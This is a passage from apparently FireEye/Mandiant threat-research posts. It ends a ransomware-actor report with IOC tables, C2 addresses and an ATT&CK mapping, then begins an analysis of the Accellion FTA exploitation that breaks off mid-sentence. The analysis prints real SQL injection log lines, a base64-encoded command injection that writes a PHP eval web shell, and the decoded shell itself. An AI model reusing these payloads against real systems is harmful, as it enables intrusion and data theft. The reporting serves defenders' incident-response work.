        valign="top"><p>95b78f4d3602aeea4f7a33c9f1b49a97</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>0378897e4ec1d1ee4637cff110635141</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>c803200ad4b9f91659e58f0617f0dafa</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>ad4d445091a3b66af765a1d653fd1eb7</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>9ecf25b1e9be0b20822fe25269fa5d02</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>e319f5a8fe496c0c8247e27c3469b20d</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>a8a7059278d82ce55949168fcd1ddde4</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>aea530f8a0645419ce0abe1bf2dc1584</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>3098fbc98e90d91805717d7a4f946c27</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>45.141.84.212:4132</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>45.141.84.223:4132</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>79.141.166.158:4124</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>149.28.201.253:4114</p> </td> <td
        width="312" valign="top"><p>SYSTEMBC</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>193.34.167.34:80 </p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>195.123.240.219:80</p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>23.227.193.167:80</p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>5.149.253.199:80 </p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>e124cd26fcce258addc85d7f010655ea</p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>7ae990c12bf5228b6d1b90d40ad0a79f</p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>3eb552ede658ee77ee4631d35eac6b43</p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>c188c6145202b65a941c41e7ff2c9afd</p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>2f43055df845742d137a18b347f335a5</p> </td> <td
        width="312" valign="top"><p>BEACON</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>87dc37e0edb39c077c4d4d8f1451402c</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>1efababd1d6bd869f005f92799113f42</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>a64e7dd557e7eab3513c9a5f31003e68</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>9760913fb7948f2983831d71a533a650</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312"
        valign="top"><p>14467102f8aa0a0d95d0f3c0ce5f0b59</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>colombosuede.club</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>colosssueded.top</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>golddisco.top</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>june85.cyou</p> </td> <td
        width="312" valign="top"><p>ICEDID</p> </td> </tr></tbody></table>
 <h4>Appendix: Mandiant Security Validation Actions</h4>
 <p>Organizations can validate their security controls against more than
  60 actions with <a
    href="/content/fireeye-www/en_US/mandiant/security-validation.html">Mandiant
    Security Validation</a>.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="98" valign="bottom"><p>
          <b>VID</b></p> </td> <td width="526" valign="bottom"><p>
          <b>Name</b></p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-509</p> </td> <td
        width="526" valign="bottom"><p>Phishing Email - Malicious
          Attachment, MOUSEISLAND, Macro Based Downloader</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A150-326</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          MOUSEISLAND, Download, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A150-433</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          MOUSEISLAND, Download, Variant #2</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-282</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          MOUSEISLAND Downloader, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-632</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater - MOUSEISLAND
          Downloader, Execution</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-266</p> </td> <td
        width="526" valign="bottom"><p>Command and Control -
          MOUSEISLAND, HTTP GET Request for PHOTOLOADER</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-280</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          PHOTOLOADER, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-263</p> </td> <td
        width="526" valign="bottom"><p>Command and Control -
          PHOTOLOADER, DNS Query #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-281</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - ICEDID
          Stage 3, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-279</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - ICEDID
          Final Payload, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-265</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - ICEDID, DNS
          Query #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-264</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - ICEDID, DNS
          Query #2</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-037</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-038</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #2</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-039</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #3</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-040</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #4</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-041</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #5</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-042</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #6</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-043</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #7</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-044</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #8</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-045</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - MAZE,
          Download, Variant #9</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-878</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - MAZE
          Ransomware, C2 Check-in</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-030</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - MAZE
          Ransomware, C2 Beacon, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-031</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - MAZE
          Ransomware, C2 Beacon, Variant #2</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-032</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - MAZE
          Ransomware, C2 Beacon, Variant #3</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-734</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater - MAZE, PsExec
        Execution</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-487</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater - MAZE
          Ransomware, Encoded PowerShell Execution</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-485</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater - MAZE
          Ransomware Execution, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-486</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater - MAZE
          Ransomware Execution, Variant #2</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-491</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - MAZE, Create
        Target.lnk</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-494</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - MAZE, Dropping
          Ransomware Note Burn Directory</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-495</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - MAZE, Traversing
          Directories and Dropping Ransomware Note, DECRYPT-FILES.html
        Variant</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-496</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - MAZE, Traversing
          Directories and Dropping Ransomware Note, DECRYPT-FILES.txt
        Variant</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-498</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - MAZE, Desktop
          Wallpaper Ransomware Message</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A150-668</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          EGREGOR, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-460</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - EGREGOR,
          GET DLL Payload</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A150-675</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater - EGREGOR,
          Execution, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-271</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - BEACON,
          Download, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A150-610</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - BEACON,
        Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A150-609</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - BEACON,
        Check-in</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-732</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater - BEACON, Mixed
          Unicode-Escaped and ASCII Characters Execution</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-514</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          WINDARC, Download, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-072</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          SYSTEMBC Proxy, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-886</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          Rclone.exe, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-880</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          Bloodhound Ingestor C Sharp Executable Variant, Download</p>
      </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-881</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          Bloodhound Ingestor C Sharp PowerShell Variant, Download</p>
      </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-882</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          Bloodhound Ingestor PowerShell Variant, Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-877</p> </td> <td
        width="526" valign="bottom"><p>Active Directory - BloodHound,
          CollectionMethod All</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A101-513</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer -
          SOURBITS, Download, Variant #1</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-733</p> </td> <td
        width="526" valign="bottom"><p>Protected Theater -
          CVE-2020-0787, Arbitrary File Move</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-353</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - KOADIC
          Agent (mshta)</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-355</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - Multiband
          Communication using KOADIC</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-088</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - Timestomp W/
        PowerShell</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-277</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - EICAR COM File
          Download via PowerShell</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-281</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - EICAR TXT File
          Download via PowerShell</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-664</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - EICAR, Download with
        PowerShell</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A150-054</p> </td> <td
        width="526" valign="bottom"><p>Malicious File Transfer - EMPIRE,
        Download</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-327</p> </td> <td
        width="526" valign="bottom"><p>Command and Control - PowerShell
          Empire Agent (http)</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-328</p> </td> <td
        width="526" valign="bottom"><p>Lateral Movement, Execution -
        PsExec</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-498</p> </td> <td
        width="526" valign="bottom"><p>Scanning Activity - TCP Port Scan
          for Open RDP</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-502</p> </td> <td
        width="526" valign="bottom"><p>Scanning Activity - UDP Port Scan
          for Open RDP</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A100-316</p> </td> <td
        width="526" valign="bottom"><p>Lateral Movement - PSSession and
        WinRM</p> </td> </tr>
    <tr>
      <td width="98" valign="bottom"><p>A104-081</p> </td> <td
        width="526" valign="bottom"><p>Host CLI - Mshta</p> </td> </tr></tbody></table>
 <h4>Appendix: UNC2198 MITRE ATT&amp;CK Mapping</h4>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="180" valign="top"><p>
          <b>ATT&amp;CK Tactic Category</b></p> </td> <td width="444" valign="top"><p>
          <b>Techniques</b></p> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Resource Development</p> </td> <td
        width="444" valign="top"><p>Acquire Infrastructure
        (T1583)<b></b></p> <ul> <li>Virtual Private Server
          (T1583.003)</li> </ul> <p>Develop Capabilities (T1587)</p>
          <ul> <li>Digital Certificates (T1587.003)</li> </ul> <p>Obtain
          Capabilities (T1588)</p> <ul> <li>Code Signing Certificates
          (T1588.003)</li> <li>Digital Certificates (T1588.004)</li>
        </ul> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Initial Access</p> </td> <td
        width="444" valign="top"><p>Phishing (T1566)</p> <ul>
            <li>Spearphishing Attachment (T1566.001)</li> </ul>
          <p>External Remote Services (T1133)</p> <p>Valid Accounts
        (T1078)</p> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Execution</p> </td> <td
        width="444" valign="top"><p>Command and Scripting Interpreter
        (T1059)</p> <ul> <li>PowerShell (T1059.001)</li> <li>Visual
            Basic (T1059.005)</li> <li>Windows Command Shell
          (T1059.003)</li> </ul> <p>Scheduled Task/Job (T1053)</p> <ul>
            <li>Scheduled Task (T1053.005)</li> </ul> <p>System Services
        (T1569)</p> <ul> <li>Service Execution (T1569.002)</li> </ul>
          <p>User Execution (T1204)</p> <ul> <li>Malicious File
          (T1204.002)</li> </ul> <p>Windows Management Instrumentation
        (T1047)</p> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Persistence</p> </td> <td
        width="444" valign="top"><p>External Remote Services (T1133)</p>
          <p>Scheduled Task/Job (T1053)</p> <ul> <li>Scheduled Task
          (T1053.005)</li> </ul> <p>Valid Accounts (T1078)</p> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Privilege Escalation</p> </td> <td
        width="444" valign="top"><p>Process Injection (T1055)</p>
          <p>Scheduled Task/Job (T1053)</p> <ul> <li>Scheduled Task
          (T1053.005)</li> </ul> <p>Valid Accounts (T1078)</p> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Defense Evasion</p> </td> <td
        width="444" valign="top"><p>Impair Defenses (T1562)</p> <ul>
            <li>Disable or Modify System Firewall (T1562.004)</li>
            <li>Disable or Modify Tools (T1562.001)</li> </ul>
          <p>Indicator Removal on Host (T1070)</p> <ul> <li>Timestomp
          (T1070.006)</li> </ul> <p>Indirect Command Execution
        (T1202)</p> <p>Modify Registry (T1112)</p> <p>Obfuscated Files
          or Information (T1027)</p> <ul> <li>Steganography
          (T1027.003)</li> </ul> <p>Process Injection (T1055)</p>
          <p>Signed Binary Proxy Execution (T1218)</p> <ul> <li>Mshta
          (T1218.005)</li> </ul> <p>Subvert Trust Controls (T1553)</p>
          <ul> <li>Code Signing (T1553.002)</li> </ul> <p>Valid Accounts
        (T1078)</p> <p>Virtualization/Sandbox Evasion (T1497)<br /> </p>
      </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Credential Access</p> </td> <td
        width="444" valign="top">OS Credential Dumping (T1003)</td> </tr>
    <tr>
      <td width="180" valign="top"><p>Discovery</p> </td> <td
        width="444" valign="top"><p>Account Discovery (T1087)</p> <ul>
            <li>Local Account (T1087.001)</li> </ul> <p>Domain Trust
          Discovery (T1482)</p> <p>File and Directory Discovery
        (T1083)</p> <p>Permission Groups Discovery (T1069)</p> <p>System
          Information Discovery (T1082)</p> <p>System Network
          Configuration Discovery (T1016)</p> <p>System Owner/User
          Discovery (T1033)</p> <p>Virtualization/Sandbox Evasion
        (T1497)</p> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Lateral Movement</p> </td> <td
        width="444" valign="top"><p>Remote Services (T1021)</p> <ul>
            <li>Remote Desktop Protocol (T1021.001)</li> <li>SMB/Windows
            Admin Shares (T1021.002)</li> <li>SSH (T1021.004)</li> </ul>
      </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Collection</p> </td> <td
        width="444" valign="top"><p>Archive Collected Data (T1560)</p>
          <ul> <li>Archive via Utility (T1560.001)</li> </ul> </td> </tr>
    <tr>
      <td width="180" valign="top"><p>Command and Control</p> </td> <td
        width="444" valign="top"><p>Application Layer Protocol
        (T1071)</p> <ul> <li>Web Protocols (T1071.001)</li> </ul>
          <p>Encrypted Channel (T1573)</p> <ul> <li>Asymmetric
            Cryptography (T1573.002)</li> </ul> <p>Ingress Tool Transfer
        (T1105)</p> <p>Proxy (T1090)</p> <ul> <li>Multi-hop Proxy
          (T1090.003)</li> </ul> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html2021-02-25T16:00:00.000Z2021-02-25T16:47:01.987ZCyber Criminals Exploit Accellion FTA for Data Theft and Extortionnoemail@noemail.orgAndrew Moore<p>Starting in mid-December 2020, malicious actors that Mandiant tracks
  as UNC2546 exploited multiple zero-day vulnerabilities in Accellion’s
  legacy File Transfer Appliance (FTA) to install a newly discovered web
  shell named DEWMODE. The motivation of UNC2546 was not immediately
  apparent, but starting in late January 2021, several organizations
  that had been impacted by UNC2546 in the prior month began receiving
  extortion emails from actors threatening to publish stolen data on the
  “CL0P^_- LEAKS&quot; .onion website. Some of the published victim data
  appears to have been stolen using the DEWMODE web shell.</p>
 <p>Notably, the number of victims on the “CL0P^_- LEAKS&quot; shaming
  website has increased in February 2021 with organizations in the
  United States, Singapore, Canada, and the Netherlands recently outed
  by these threat actors. Mandiant has previously reported that <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/10/fin11-email-campaigns-precursor-for-ransomware-data-theft.html">FIN11
    has threatened to post stolen victim data</a> on this same .onion
  site as an additional tactic to pressure victims into paying extortion
  demands following the deployment of CLOP ransomware. However, in
  recent CLOP extortion incidents, no ransomware was deployed nor were
  the other hallmarks of FIN11 present.</p>
 <p>We are currently tracking the exploitation of the zero-day Accellion
  FTA vulnerabilities and data theft from companies running the legacy
  FTA product as UNC2546, and the subsequent extortion activity as
  UNC2582. We have identified overlaps between UNC2582, UNC2546, and
  prior FIN11 operations, and we will continue to evaluate the
  relationships between these clusters of activity. For more information
  on our use of ‘UNC’ designations, see our blog post, &quot;<a
    href="/content/fireeye-www/en_US/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html">DebUNCing
    Attribution: How Mandiant Tracks Uncategorized Threat Actors</a>.&quot;</p>
 <p>Mandiant has been working closely with Accellion in response to
  these matters and will be producing a complete security assessment
  report in the coming weeks. At this time, <a
    href="https://www.accellion.com/company/press-releases/accellion-provides-update-to-recent-fta-security-incident/">Accellion
    has patched all FTA vulnerabilities</a> known to be exploited by the
  threat actors and has added new monitoring and alerting capabilities
  to flag anomalies associated with these attack vectors. Mandiant has
  validated these patches. Mandiant is currently performing penetration
  testing and code review of the current version of the Accellion FTA
  product and has not found any other critical vulnerabilities in the
  FTA product based on our analysis to date. Accellion customers using
  the FTA legacy product were the targets of the attack.</p>
 <p>Accellion FTA is a 20-year-old product nearing end of life.
  Accellion strongly recommends that <a
    href="https://www.accellion.com/products/fta/">FTA customers migrate
    to kiteworks</a>, Accellion’s <a
    href="https://www.accellion.com/">enterprise content firewall</a>
  platform. Per Accellion, Kiteworks is built on an entirely different
  code base.</p>
 <p>The following CVEs have since been reserved for tracking the
  recently patched Accellion FTA vulnerabilities:</p>
 <ul> <li>
    <a
    href="https://nvd.nist.gov/vuln/detail/CVE-2021-27101">CVE-2021-27101</a>
    - SQL injection via a crafted Host header</li> <li>
    <a
    href="https://nvd.nist.gov/vuln/detail/CVE-2021-27102">CVE-2021-27102</a>
    - OS command execution via a local web service call</li> <li>
    <a
    href="https://nvd.nist.gov/vuln/detail/CVE-2021-27103">CVE-2021-27103</a>
    - SSRF via a crafted POST request</li> <li>
    <a
    href="https://nvd.nist.gov/vuln/detail/CVE-2021-27104">CVE-2021-27104</a>
    - OS command execution via a crafted POST request</li> </ul>
 <h4>UNC2546 and DEWMODE</h4>
 <p>In mid-December 2020, Mandiant responded to multiple incidents in
  which a web shell we call DEWMODE was used to exfiltrate data from
  Accellion FTA devices. The Accellion FTA device is a purpose-built
  application designed to allow an enterprise to securely transfer large
  files. The exfiltration activity has affected entities in a wide range
  of sectors and countries.</p>
 <p>Across these incidents, Mandiant observed common infrastructure
  usage and TTPs, including exploitation of FTA devices to deploy the
  DEWMODE web shell. Mandiant determined that a common threat actor we
  now track as UNC2546 was responsible for this activity. While complete
  details of the vulnerabilities leveraged to install DEWMODE are still
  being analyzed, evidence from multiple client investigations has shown
  multiple commonalities in UNC2546's activities.</p>
 <h4>Evidence of Exploitation and DEWMODE Installation</h4>
 <p>Mandiant has been able reconstruct many of the details about how
  Accellion FTAs have been compromised through examination of Apache and
  system logs from impacted devices—from initial compromise, to
  deployment of DEWMODE, and follow-on interaction.</p>
 <p>The earliest identification of activity associated with this
  campaign occurred in mid-December 2020. At this time, Mandiant
  identified UNC2546 leveraging an SQL injection vulnerability in the
  Accellion FTA. This SQL injection served as the primary intrusion vector.</p>
 <p>Mandiant observed evidence of SQL injection followed by subsequent
  requests to additional resources, as shown in Figure 1.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">[21/Dec/2020:18:14:32 +0000]
            [.'))union(select(c_value)from(t_global)where(t_global.c_param)=('w1'))#/sid#935ee00][rid#9700968/initial]
            (1) pass through /courier/document_root.html</span></p> <p>
          <span class="code">[21/Dec/2020:18:14:33 +0000]
            ['))union(select(loc_id)from(net1.servers)where(proximity)=(0))#/sid#935ee00][rid#9706978/initial]
            (1) pass through /courier/document_root.html</span></p> <p>
          <span class="code">[21/Dec/2020:18:14:33 +0000]
            [.'))union(select(reverse(c_value))from(t_global)where(t_global.c_param)=('w1'))#/sid#935ee00][rid#971c098/initial]
            (1) pass through /courier/document_root.html</span></p> <p>
          <span class="code">[21/Dec/2020:18:14:34 +0000]
            [&lt;redacted&gt;/sid#935ee00][rid#971a090/initial] (1) pass
            through /courier/sftp_account_edit.php</span></p> <p>
          <span class="code">[21/Dec/2020:18:14:35 +0000]
            [&lt;redacted&gt;/sid#935ee00][rid#9706978/initial] (1) pass
            through /courier/oauth.api</span></p> <p>
          <span class="code">[21/Dec/2020:18:14:35 +0000]
            [&lt;redacted&gt;/sid#935ee00][rid#9708980/initial] (1) pass
            through /courier/oauth.api</span></p> <p> </p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: SQL injection log</span></p>
 <p>UNC2546 has leveraged this SQL injection vulnerability to retrieve a
  key which appears to be used in conjunction with a request to the file
    <span class="code">sftp_account_edit.php</span>. Immediately after
  this request, the built-in Accellion utility <span
  class="code">admin.pl</span> was executed, resulting in an eval web
  shell being written to <span class="code">oauth.api</span>.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><span
          class="code">PWD=/home/seos/courier ; USER=root ;
          COMMAND=/usr/local/bin/admin.pl --edit_user=F <br />
          --mount_cifs=-<br />
          V,DF,$(echo${IFS}PD9waHAKCmlmKGlzc2V0KCRfUkVRVUVTVFsndG9rZW4nXSkpCnsKICAgIGV2YWwoYm<br />
          FzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ3Rva2VuJ10pKTsKfQplbHNlIGlmKGlzc2V0KCRfUkVRVUVTVFsnd<br />
          XNlcm5hbWUnXSkpCnsKICAgIHN5c3RlbSgkX1JFUVVFU1RbJ3VzZXJuYW1lJ10pOwp9CmVsc2UKewogICAgaG<br />
          VhZGVyKCdMb2NhdGlvbjogLycpOwp9|base64${IFS}-d|tee${IFS}/home/seos/courier/oauth.api);FUK;&quot;,PASSWORD
          # \&quot; --passwd=pop</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: Excerpt from log showing creation of
    eval web shell</span></p>
 <p>The decoded contents are shown in Figure 3.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">&lt;?php</span></p> <p>
          <span class="code">if(isset($_REQUEST['token']))<br />
            {<br />      eval(base64_decode($_REQUEST['token']));<br />
            }<br />  else if(isset($_REQUEST['username']))<br />
            {<br />      system($_REQUEST['username']);<br />  }<br />
            else<br />  {<br />      header('Location: /');<br />
        }</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: Decoded eval web shell</span></p>
 <p>Almost immediately following this sequence, the DEWMODE web shell is
  written to the system. The timing of these requests suggests that
  DEWMODE was delivered via the <span class="code">oauth.api</span> web
  shell; however, the available evidence does not indicate the exact
  mechanism used to write DEWMODE to disk.</p>
 <p>Mandiant has identified the DEWMODE web shell in one of the
  following two locations:</p>
 <ul> <li>
    <span class="code">/home/seos/courier/about.html</span></li> <li>
    <span class="code">/home/httpd/html/about.html</span></li> </ul>
 <p>The DEWMODE web shell (Figure 4) extracts a list of available files
  from a MySQL database on the FTA and lists those files and
  corresponding metadata—file ID, path, filename, uploader, and
  recipient—on an HTML page. UNC2546 then uses the presented list to
  download files through the DEWMODE web shell. Download requests are
  captured in the FTA’s web logs, which will contain requests to the
  DEWMODE web shell with encrypted and encoded URL parameters, where dwn
  is the file path and fn is the requested file name (Figure 5). The
  encrypted file path and name values visible in web logs can be
  decrypted using key material obtained from the database used by the
  targeted FTA. Given the complex nature of this process, if your
